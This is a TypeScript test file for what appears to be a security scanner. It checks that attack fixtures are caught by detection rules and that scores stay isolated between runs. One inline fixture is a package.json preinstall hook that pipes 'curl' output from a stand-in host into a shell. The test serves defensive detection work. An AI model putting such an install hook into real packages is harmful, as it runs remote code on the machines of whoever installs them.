/**
 * tests/benches/hostile.test.ts — Suite A hostile bench (plan 2026-10-27).
 * Hand-written attack fixtures (tests/benches/hostile/<rule>.json) must be
 * caught on at least one real surface (gate legs or runCheck tree scan).
 * 100% of the curated set: a fixture that can't be caught is a rule gap
 * (fix the rule + add a corpus TP) or belongs in the benign set as a TN —
 * never tolerated here. Deliberately uncovered shapes live in
 * tests/benches/KNOWN-GAPS.md instead of being relabeled benign.
 * Run: bun test tests/benches/hostile.test.ts
 */
import { describe, it, expect } from "bun:test";
import { loadHostileBenches, scoreVariant } from "../../tools/eval";

const benches = loadHostileBenches();

describe("hostile bench fixtures", () => {
  it("covers all 11 rules with >=6 fixtures each", () => {
    expect(benches).toHaveLength(11);
    for (const b of benches) {
      expect(b.cases.length).toBeGreaterThanOrEqual(6);
    }
  });

  for (const b of benches) {
    it(`${b.rule}: every fixture caught on a real surface`, () => {
      for (const c of b.cases) {
        const score = scoreVariant(b.rule, c.payload, c.path);
        expect(score.error, `${c.id} errored: ${score.error}`).toBeUndefined();
        expect(score.caught, `${c.id}: ${c.payload.slice(0, 80)}`).toBe(true);
      }
    }, 60_000);
  }

  it("isolates scores: earlier probes at other paths never leak (review finding)", () => {
    // SUP package.json probe first, then a benign payload: without
    // per-call isolation the leftover package.json re-fires.
    const hot = scoreVariant("SUP-01", '{"name":"x","scripts":{"preinstall":"curl http://x.test/a | sh"}}', "package.json");
    expect(hot.caught).toBe(true);
    const cold = scoreVariant("SUP-01", "echo hello");
    expect(cold.error).toBeUndefined();
    expect(cold.caught).toBe(false);
  });
});
